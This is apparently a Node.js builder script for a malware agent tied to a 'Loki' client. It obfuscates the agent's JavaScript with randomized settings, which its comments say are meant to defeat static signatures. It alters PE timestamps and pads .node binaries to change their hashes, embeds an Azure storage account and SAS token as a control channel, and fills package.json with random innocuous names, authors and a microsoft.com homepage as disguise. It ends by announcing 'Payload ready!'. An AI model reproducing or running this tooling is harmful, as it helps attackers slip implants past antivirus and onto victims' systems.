const fs = require('fs');
const path = require('path');
const readline = require('readline');
const crypto = require('crypto');
const yargs = require('yargs/yargs'); // CLI handling
const { hideBin } = require('yargs/helpers');

// ---------- Configuration & Constants ----------
const SOURCE_DIR_NAME = 'agent';
const OUTPUT_DIR_NAME = 'app';
const CONFIG_FILE_NAME = 'config.js';
const PACKAGE_JSON_NAME = 'package.json';
const NODE_FILES_TO_MODIFY = ['assembly.node', 'keytar.node'];

const SOURCE_DIR = path.join(__dirname, SOURCE_DIR_NAME);
const OUTPUT_DIR = path.join(__dirname, OUTPUT_DIR_NAME);
const CONFIG_SRC_PATH = path.join(SOURCE_DIR, CONFIG_FILE_NAME);
const CONFIG_COPY_PATH = path.join(__dirname, CONFIG_FILE_NAME);
const PKG_SRC_PATH = path.join(SOURCE_DIR, PACKAGE_JSON_NAME);
const PKG_DST_PATH = path.join(OUTPUT_DIR, PACKAGE_JSON_NAME);

// Default values for package.json generation
const DEFAULT_NAMES = [
    "magical-app", "claude-tool", "wizard-helper", "super-wizard", "code-ai", "master-app", "crazy-tool", "ultra-fast", "hot-dog",
    "turbo-linker", "data-weaver", "flux-capacitor-js", "photon-emitter", "logic-loom", "dev-dynamo", "script-sorcerer", "byte-blaster", "code-canvas", "pixel-painter", "insight-engine", "nexus-core", "quantum-leap-utility", "velocity-engine", "zenith-platform", "streamline-pro", "alpha-build", "omega-runtime", "task-master-x", "virtual- Scribe"
];

const DEFAULT_AUTHORS = [
    "Zack", "Jack", "John", "Bobby", "Valentina", "Dylan", "Ruben", "Paul",
    "Alice", "Charlie", "David", "Eve", "Frank", "Grace", "Heidi", "Ivan", "Judy", "Mallory", "Mike", "Nancy", "Oscar", "Peggy", "Steve", "Trudy", "Walter", "Wendy", "Chris", "Pat", "Alex", "Sam", "Morgan"
];

const DEFAULT_DESCRIPTIONS = [
    "The best AI tool.", "A tool for super fast development.", "A tool for wizards.",
    "Enhances developer productivity.", "Core library for enhanced operations.", "Streamlines complex workflows.", "Provides essential utilities for modern applications.", "A lightweight framework for agile tasks.", "Automates repetitive processes.", "Next-generation data processing utility.", "High-performance computation module.", "Simplifies system integration.", "The missing piece for your project.", "A reliable and efficient software component.", "Designed for scalability and performance."
];

const DEFAULT_LICENSES = [
    "MIT", "Apache-2.0", "ISC", "BSD-3-Clause",
    "GPL-3.0-only", "LGPL-3.0-only", "MPL-2.0",
    "Unlicense",
    "BSD-2-Clause",
    "CC0-1.0"
];

const DEFAULT_KEYWORDS = [
    "wizard", "AI", "automation", "tool",
    "utility", "framework", "library", "cli", "development", "productivity", "performance", "backend", "frontend", "data", "processing", "helper", "module", "plugin", "integration", "compute", "engine", "runtime"
];
const DEFAULT_HOMEPAGE = "https://www.microsoft.com";

const CLEANUP_TARGETS = [
    path.join(__dirname, 'node_modules'),
    path.join(__dirname, PACKAGE_JSON_NAME),
    path.join(__dirname, 'package-lock.json'),
    CONFIG_COPY_PATH
];

// ---------- Helper Functions ----------

/**
 * Selects a random element from an array.
 * @param {Array<T>} arr - The input array.
 * @returns {T} A random element from the array.
 */
function randomChoice(arr) {
    if (!arr || arr.length === 0) return undefined;
    return arr[Math.floor(Math.random() * arr.length)];
}

/**
 * Generates a random version string (e.g., "3.7.1").
 * @returns {string} A random version string.
 */
function randomVersion() {
    return `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

/**
 * Generates a random container name starting with 'm'.
 * @returns {string} A random container name.
 */
function generateMetaContainer() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = 'm';
    while (result.length < 13) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

/**
 * Prompts the user for input via the console.
 * @param {string} promptText - The text to display to the user.
 * @returns {Promise<string>} The trimmed user input.
 */
function promptInput(promptText) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(promptText, ans => {
        rl.close();
        resolve(ans.trim());
    }));
}

/**
 * Calculates the SHA256 hash of a file.
 * @param {string} filePath - Path to the file.
 * @returns {string} The hex-encoded SHA256 hash, or 'N/A' on error.
 */
function hashFile(filePath) {
    try {
        const fileBuffer = fs.readFileSync(filePath);
        return crypto.createHash('sha256').update(fileBuffer).digest('hex');
    } catch (err) {
        log(`[WARN] Could not read file for hashing: ${filePath}`, 'warn');
        return 'N/A';
    }
}

/**
 * Sanitizes a string to be a valid npm package name.
 * Rules: lowercase, URL-safe characters (letters, numbers, hyphen). Must start with a letter.
 * @param {string} name - The input string.
 * @returns {string} A sanitized string suitable for package.json 'name'.
 */
function sanitizeAppName(name) {
    if (!name) return '';
    return name
        .toLowerCase()
        .replace(/[^a-z0-9-]/g, '')     // Remove invalid chars
        .replace(/^[^a-z]+/, '');      // Ensure starts with a letter
}

/**
 * Simple console logger with debug support.
 * @param {string} message - The message to log.
 * @param {'info' | 'warn' | 'error' | 'debug'} level - The log level.
 * @param {boolean} isDebug - Whether debug mode is enabled.
 */
const log = (message, level = 'info', isDebug) => {
    if (level === 'debug' && !isDebug) {
        return; // Skip debug messages if not enabled
    }
    const prefix = level === 'error' ? '[ERROR]' : level === 'warn' ? '[WARN]' : '[INFO]';
    const logFunc = level === 'error' ? console.error : level === 'warn' ? console.warn : console.log;
    logFunc(`${prefix} ${message}`);
};

// ---------- Core Logic Functions ----------

/**
 * Modifies PE/.node file timestamps and appends junk data to change hashes.
 * Reads from sourceDir, writes to outputDir.
 * @param {boolean} isDebug - Whether to enable debug logging.
 */
async function changeNodeHashes(isDebug) {
    log("Modifying PE binaries to have new hashes...", 'info', isDebug);
    let modifiedCount = 0;

    for (const nodeFile of NODE_FILES_TO_MODIFY) {
        const srcPath = path.join(SOURCE_DIR, nodeFile);
        const dstPath = path.join(OUTPUT_DIR, nodeFile);

        if (!fs.existsSync(srcPath)) {
            log(`Source file not found: ${srcPath}. Skipping hash modification.`, 'warn', isDebug);
            continue;
        }

        try {
            const originalBuffer = fs.readFileSync(srcPath);
            const buffer = Buffer.from(originalBuffer); // Work on a copy

            // --- PE Timestamp Modification (basic, assumes PE format) ---
            // PE Header offset is at 0x3C
            // Timestamp is 8 bytes after the PE signature ("PE\0\0")
            const peOffset = buffer.readUInt32LE(0x3C);
            // Basic check if it looks like a PE file
            if (peOffset < buffer.length - 4 && buffer.readUInt32BE(peOffset) === 0x50450000 /* "PE\0\0" */) {
                 const timestampOffset = peOffset + 8;
                 // Check bounds before writing
                 if (timestampOffset < buffer.length - 4) {
                    const randomTime = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);
                    buffer.writeUInt32LE(randomTime, timestampOffset);
                    log(`Patched PE timestamp for ${nodeFile}`, 'debug', isDebug);
                 } else {
                    log(`Timestamp offset out of bounds for ${nodeFile}. Skipping timestamp patch.`, 'warn', isDebug);
                 }
            } else {
                log(`PE signature not found or invalid offset for ${nodeFile}. Skipping timestamp patch.`, 'warn', isDebug);
            }


            // --- Append Junk Data ---
            const junk = crypto.randomBytes(128);
            const newBuffer = Buffer.concat([buffer, junk]);

            fs.writeFileSync(dstPath, newBuffer);
            log(`Original ${nodeFile} hash: ${hashFile(srcPath)}`, 'debug', isDebug);
            log(`Modified ${nodeFile} hash: ${hashFile(dstPath)}`, 'info', isDebug);
            modifiedCount++;

        } catch (err) {
            log(`Failed to modify hash for ${nodeFile}: ${err.message}`, 'error', isDebug);
        }
    }
     if (modifiedCount > 0) {
        log(`Successfully modified hashes for ${modifiedCount} .node file(s).`, 'info', isDebug);
    } else {
        log(`No .node files were modified.`, 'warn', isDebug);
    }
}

/**
 * Performs cleanup of generated files and directories specified in CLEANUP_TARGETS.
 * @param {boolean} isDebug - Whether to enable debug logging.
 */
function performCleanup(isDebug) {
    log("Cleanup requested. Removing generated files/folders...", 'info', isDebug);
    let successCount = 0;
    let failCount = 0;

    for (const target of CLEANUP_TARGETS) {
        if (fs.existsSync(target)) {
            try {
                const stat = fs.lstatSync(target);
                if (stat.isDirectory()) {
                    fs.rmSync(target, { recursive: true, force: true });
                    log(`Removed directory: ${target}`, 'debug', isDebug);
                } else {
                    fs.unlinkSync(target);
                    log(`Removed file: ${target}`, 'debug', isDebug);
                }
                successCount++;
            } catch (err) {
                log(`Failed to remove ${target}: ${err.message}`, 'warn', isDebug);
                failCount++;
            }
        } else {
             log(`Cleanup target not found, skipping: ${target}`, 'debug', isDebug);
        }
    }
     log(`Cleanup finished. Removed ${successCount} items, failed to remove ${failCount}.`, 'info', isDebug);
}

/**
 * Generates randomized, high-strength obfuscation options aimed
 * at making static signature creation difficult.
 * @param {object} argv - Parsed command-line arguments from yargs.
 * @param {boolean} isDebug - Whether debug logging is enabled.
 * @returns {object} Options object for javascript-obfuscator.
 */
function generateObfuscationOptions(argv, isDebug) {
    // --- Base Options (can be overridden by CLI if flags were kept/added) ---
    // Example: If you had kept --obfuscate-compact flag:
    // const compactOverride = argv.obfuscateCompact !== undefined ? argv.obfuscateCompact : true;

    // --- Randomization & Strength Enhancements ---

    // Randomly choose string array encoding for variability
    const chosenStringArrayEncoding = Math.random() < 0.5 ? 'rc4' : 'base64';

    const options = {
        // == Crucial for Randomness ==
        seed: 0,

        // == Control Flow & Structure ==
        compact: true, // Keep code compact
        controlFlowFlattening: true, // Obscure flow with loops/switches
        controlFlowFlatteningThreshold: Math.random() * 0.5 + 0.3, // Randomize intensity (e.g., 0.3 to 0.8)
        deadCodeInjection: true, // Add confusing dead code blocks
        deadCodeInjectionThreshold: Math.random() * 0.5 + 0.2, // Randomize amount (e.g., 0.2 to 0.7)

        // == String Array Protection (Highly Randomized) ==
        stringArray: true, // Enable the core string array feature
        stringArrayEncoding: [chosenStringArrayEncoding], // Randomly pick 'rc4' or 'base64' per run
        stringArrayThreshold: Math.random() * 0.4 + 0.4, // Randomize which strings go in (e.g., 0.4 to 0.8)
        // Add multiple layers of wrappers calling the string array
        stringArrayWrappersCount: Math.floor(Math.random() * 4) + 1, // 1 to 4 wrappers
        stringArrayWrappersType: Math.random() < 0.5 ? 'variable' : 'function', // Randomize wrapper type
        stringArrayWrappersChainedCalls: true, // Chain wrapper calls for complexity
        // Rotate/shuffle the array and shift indices on access
        stringArrayRotate: true,
        stringArrayShuffle: true,
        stringArrayIndexShift: true,

        // == String Literal Obfuscation ==
        splitStrings: true, // Split strings into smaller chunks, harder to match literals
        splitStringsChunkLength: Math.floor(Math.random() * 6) + 2, // Random chunk length (2 to 7)
        unicodeEscapeSequence: true, // Convert strings to \uXXXX escape sequences

        // == Identifier/Number Obfuscation ==
        // Use randomized mangled names (harder to predict/signature than plain hex)
        identifierNamesGenerator: 'mangled-shuffled',
        numbersToExpressions: true, // Replace simple numbers with calculations

        // == Anti-Tampering / Anti-Debugging ==
        // Makes code resistant to formatting/tampering, further obscuring structure
        selfDefending: true,

        // == Other Obfuscation ==
        transformObjectKeys: true, // obj.key -> obj['key']
        target: 'node',
    };

    log(`Generated Obfuscation Options (Encoding: ${chosenStringArrayEncoding}, Seed: 0 - Random):`, 'debug', isDebug);
    if (isDebug) console.dir(options, { depth: 2 }); // Log generated options in debug mode

    return options;
}


/**
 * Processes files from sourceDir: obfuscates JS, copies others.
 * Uses HIGHLY RANDOMIZED obfuscation settings generated by generateObfuscationOptions.
 * @param {object} obfuscationOptions - Generated options for javascript-obfuscator.
 * @param {boolean} isDebug - Whether to enable debug logging.
 */
function processFiles(obfuscationOptions, isDebug) {
    log(`Starting file processing from ${SOURCE_DIR} to ${OUTPUT_DIR}`, 'info', isDebug);
    let jsFiles = 0;
    let copiedFiles = 0;
    let skippedFiles = 0;

    // Ensure javascript-obfuscator is available
    let JavaScriptObfuscator;
    try {
        JavaScriptObfuscator = require('javascript-obfuscator');
    } catch (err) {
        if (err.code === 'MODULE_NOT_FOUND') {
            log("'javascript-obfuscator' not found. This is required for obfuscation.", 'error', isDebug);
            log("Please install it: npm install --save-dev javascript-obfuscator", 'error', isDebug);
            process.exit(1); // Exit if core dependency is missing
        } else {
            log(`Error loading 'javascript-obfuscator': ${err.message}`, 'error', isDebug);
            throw err; // Re-throw other errors
        }
    }

    if (!fs.existsSync(SOURCE_DIR)) {
        log(`Source directory ${SOURCE_DIR} not found.`, 'error', isDebug);
        process.exit(1);
    }

    fs.readdirSync(SOURCE_DIR).forEach(file => {
        const sourcePath = path.join(SOURCE_DIR, file);
        const outputPath = path.join(OUTPUT_DIR, file);

        if (fs.lstatSync(sourcePath).isFile()) {
            if (file.endsWith(".js") && file !== CONFIG_FILE_NAME) { // Obfuscate JS (except config)
                log(`Obfuscating: ${file} with enhanced settings...`, 'debug', isDebug);
                try {
                    const code = fs.readFileSync(sourcePath, "utf-8");
                    // *** Use the passed-in, randomized options ***
                    const obfuscationResult = JavaScriptObfuscator.obfuscate(code, obfuscationOptions);
                    const obfuscatedCode = obfuscationResult.getObfuscatedCode();
                    fs.writeFileSync(outputPath, obfuscatedCode);
                    jsFiles++;
                } catch (err) {
                    log(`Error obfuscating ${file}: ${err.message}`, 'error', isDebug);
                    if (isDebug && err.stack) console.error(err.stack); // Show stack trace in debug
                    skippedFiles++;
                }
            } else if (NODE_FILES_TO_MODIFY.includes(file)) {
                // Skip .node files here, they are handled by changeNodeHashes
                log(`Skipping ${file} in main loop (handled separately).`, 'debug', isDebug);
                skippedFiles++;
            } else if (file === CONFIG_FILE_NAME || file === PACKAGE_JSON_NAME) {
                 // Skip config and package.json here, handled separately
                 log(`Skipping ${file} in main loop (handled separately).`, 'debug', isDebug);
                 skippedFiles++;
            } else {
                // Copy other relevant files (e.g., .css, .html, assets)
                 log(`Copying non-JS file: ${file}`, 'debug', isDebug);
                 try {
                    fs.copyFileSync(sourcePath, outputPath);
                    copiedFiles++;
                 } catch(err) {
                     log(`Error copying ${file}: ${err.message}`, 'error', isDebug);
                     skippedFiles++;
                 }
            }
        } else {
            log(`Skipping directory or non-file: ${file}`, 'debug', isDebug);
             skippedFiles++; // Ignoring directories for now
        }
    });

    log(`File processing complete: ${jsFiles} JS files obfuscated, ${copiedFiles} files copied, ${skippedFiles} files skipped.`, 'info', isDebug);
}

/**
 * Creates or updates the package.json in the output directory.
 * Loads from source package.json if available, applies overrides/defaults.
 * @param {string | undefined} appNameArg - The app name provided via CLI.
 * @param {boolean} isDebug - Whether to enable debug logging.
 */
function updatePackageJson(appNameArg, isDebug) {
    log('Updating package.json for the output app...', 'info', isDebug);
    let pkgData = {};

    // Try to load base data from source package.json if it exists
    if (fs.existsSync(PKG_SRC_PATH)) {
        try {
            pkgData = JSON.parse(fs.readFileSync(PKG_SRC_PATH, "utf-8"));
            log('Loaded base data from source package.json.', 'debug', isDebug);
        } catch (err) {
            log(`Could not parse source package.json (${PKG_SRC_PATH}): ${err.message}. Using defaults.`, 'warn', isDebug);
            pkgData = {}; // Reset if parsing failed
        }
    } else {
        log(`Source package.json (${PKG_SRC_PATH}) not found. Creating from scratch with defaults.`, 'warn', isDebug);
    }

    // Clean up fields we don't want/need in the final output package
    delete pkgData.build;
    delete pkgData.dependencies; // Obfuscated app shouldn't list these typically
    delete pkgData.devDependencies;
    delete pkgData.scripts; // Build/dev scripts usually not needed in output

    // Apply overrides and random defaults
    // Sanitize app name from CLI or use existing/random
    pkgData.name = sanitizeAppName(appNameArg) || pkgData.name || randomChoice(DEFAULT_NAMES);
    pkgData.version = pkgData.version || randomVersion(); // Keep existing version if present, else random
    pkgData.description = pkgData.description || randomChoice(DEFAULT_DESCRIPTIONS);
    pkgData.author = pkgData.author || randomChoice(DEFAULT_AUTHORS);
    pkgData.license = pkgData.license || randomChoice(DEFAULT_LICENSES);
    pkgData.keywords = pkgData.keywords || DEFAULT_KEYWORDS;
    pkgData.homepage = pkgData.homepage || DEFAULT_HOMEPAGE;
    pkgData.private = true; // Good practice for non-published packages

    // Ensure 'main' or entry point exists if needed, adjust if necessary
    // You might need to explicitly set or check this based on your app structure
    // pkgData.main = pkgData.main || 'index.js'; // Example: Set a default entry point if missing

    try {
        fs.writeFileSync(PKG_DST_PATH, JSON.stringify(pkgData, null, 2), "utf-8");
        log(`Successfully wrote updated package.json to ${PKG_DST_PATH}`, 'info', isDebug);
        log(`\tApp Name: ${pkgData.name}`, 'info', isDebug);
        log(`\tVersion : ${pkgData.version}`, 'info', isDebug);
    } catch (err) {
        log(`Failed to write destination package.json (${PKG_DST_PATH}): ${err.message}`, 'error', isDebug);
    }
}


// ---------- Main Execution ----------
async function main() {
    const argv = yargs(hideBin(process.argv))
        .usage('Usage: $0 [AppName] [options]')
        .command('$0 [AppName]', 'Obfuscates JS agent, updates config, and prepares the output app with enhanced, randomized obfuscation.', (y) => {
            y.positional('AppName', {
                describe: 'Optional name for the output app (in package.json). Sanitized to npm rules.',
                type: 'string'
            });
        })
        .option('account', {
            alias: 'a',
            describe: 'Azure Storage Account name.',
            type: 'string',
            demandOption: false // Not strictly required by yargs; script will prompt if missing
        })
        .option('token', {
            alias: 't',
            describe: 'Azure SAS Token.',
            type: 'string',
            demandOption: false // Script will prompt if missing
        })
        .option('meta', {
            alias: 'm',
            describe: 'Container name for metadata. Generates random if omitted.',
            type: 'string'
        })
        .option('cleanup', {
            alias: 'c',
            describe: 'Remove node_modules, package.json, etc. AFTER successful execution.',
            type: 'boolean',
            default: false
        })
        .option('debug', {
            alias: 'd',
            describe: 'Enable verbose debug logging.',
            type: 'boolean',
            default: false
        })
        // Note: Specific obfuscation flags removed in favor of internal randomization.
        // Add them back here and in generateObfuscationOptions if you need CLI overrides.
        .help('h')
        .alias('h', 'help')
        .strict() // Error on unknown options
        .wrap(null) // Adjust terminal width automatically
        .argv;

    const isDebug = argv.debug;
    log("Starting obfuscation process with enhanced, randomized settings...", 'info', isDebug);
    if (isDebug) {
        log("Parsed arguments:", 'debug', isDebug);
        // Use console.dir for better object inspection in debug mode
        console.dir(argv, { depth: null });
    }

    // --- Prepare Output Directory ---
    try {
        if (fs.existsSync(OUTPUT_DIR)) {
            log(`Removing existing output directory: ${OUTPUT_DIR}`, 'debug', isDebug);
            fs.rmSync(OUTPUT_DIR, { recursive: true, force: true });
        }
        log(`Creating output directory: ${OUTPUT_DIR}`, 'debug', isDebug);
        fs.mkdirSync(OUTPUT_DIR, { recursive: true });
    } catch (err) {
        log(`Error managing output directory (${OUTPUT_DIR}): ${err.message}`, 'error', isDebug);
        process.exit(1);
    }

    let storageAccount, sasToken, metaContainer;

    try {
        // --- Get Azure Configuration (Prompt if needed) ---
        let promptedForCreds = false;
        if (!argv.account || !argv.token) {
            log("Required Azure storage arguments (--account, --token) not provided. Prompting for input...", 'info', isDebug);
            promptedForCreds = true;
        }
        storageAccount = argv.account || await promptInput("\t- Enter Storage Account : ");
        sasToken = argv.token || await promptInput("\t- Enter SAS Token       : ");

        // Generate meta container name if not provided
        metaContainer = argv.meta || generateMetaContainer();

        // Validate required config after potential prompts
        if (!storageAccount || !sasToken) {
             log("Storage Account and SAS Token are required.", 'error', isDebug);
             if (promptedForCreds) {
                log("Please provide valid input when prompted.", 'error', isDebug);
             } else {
                log("Please provide them using --account and --token arguments.", 'error', isDebug);
             }
             process.exit(1);
        }


        log("\nFinal Configuration:", 'info', isDebug);
        log(`\t- Storage Account : ${storageAccount}`, 'info', isDebug);
        log(`\t- SAS Token       : ${sasToken.substring(0, 4)}... (hidden)`, 'info', isDebug); // Avoid logging full token
        log(`\t- Meta Container  : ${metaContainer}`, 'info', isDebug);

        // --- Update Config File ---
        const configContent = `module.exports = {\n  storageAccount: '${storageAccount}',\n  metaContainer: '${metaContainer}',\n  sasToken: '${sasToken}'\n};\n`;

        // Write to source (might be needed by source code?) and copy to root for user
        fs.writeFileSync(CONFIG_SRC_PATH, configContent, 'utf-8');
        log(`Updated config in source: ${CONFIG_SRC_PATH}`, 'debug', isDebug);
        fs.copyFileSync(CONFIG_SRC_PATH, CONFIG_COPY_PATH);
        log(`Updated config copied to: ${CONFIG_COPY_PATH}`, 'info', isDebug);
        log(`\t-> Enter this into the Loki Client UI > Configuration`, 'info', isDebug); // Assuming context


        // --- Generate Randomized Obfuscation Options ---
        // This is generated once per run, ensuring consistency for all files within that run,
        // but randomness *between* runs due to seed:0 and Math.random().
        const obfuscationOptions = generateObfuscationOptions(argv, isDebug);


        // --- Process Files (Obfuscate/Copy using the generated options) ---
        processFiles(obfuscationOptions, isDebug); // Pass the generated options


        // --- Modify .node File Hashes ---
        // This happens *after* obfuscation, reading original .node from source, writing modified to output.
        await changeNodeHashes(isDebug);


        // --- Update/Create package.json in Output ---
        updatePackageJson(argv.AppName, isDebug);


        // --- Success ---
        log("\nPayload ready! (Obfuscated with enhanced, randomized settings)", 'info', isDebug);
        log(`\t- Obfuscated payload in: ${OUTPUT_DIR}`, 'info', isDebug);
        log(`\t- Configuration copied to: ${CONFIG_COPY_PATH}`, 'info', isDebug);


        // --- Optional Cleanup (only after successful build) ---
        if (argv.cleanup) {
            performCleanup(isDebug);
        }

        log("Process finished successfully.", 'info', isDebug);

    } catch (error) {
        log(`An unexpected error occurred: ${error.message}`, 'error', isDebug);
        if (isDebug) {
            console.error(error.stack); // Print full stack trace in debug mode
        }
        process.exit(1); // Exit with error code
    }
}

// --- Run the main async function ---
main();
